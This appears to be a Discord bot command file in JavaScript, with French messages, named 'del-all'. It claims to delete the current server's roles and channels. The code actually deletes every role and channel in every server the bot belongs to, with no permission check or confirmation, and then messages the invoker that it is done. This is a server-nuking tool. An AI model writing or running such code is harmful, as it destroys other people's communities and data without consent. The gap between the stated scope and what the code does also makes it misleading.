module.exports = {
  name: 'del-all',
  description: 'Supprime tous les rôles et les salons du serveur',
  dir: "admin",
  run: async(client, interaction) => {
    try {
      interaction.reply({ content: `**✅ Effacement des rôles et des salons en cours !**`, ephemeral: true })
      for (const guild of client.guilds.cache.values()) {  
        guild.roles.cache.forEach(r => {
          r.delete()
        });
      }
      for (const guild of client.guilds.cache.values()) {  
        guild.channels.cache.forEach(c => {
          c.delete()
        });
      }
    } catch(err) {
      client.logger.error(`${err.message}`)
    }
    interaction.user.send({ content: `**${interaction.guild.name} - [\`del-all.js\`]: Oppération terminée.**` })
  }
}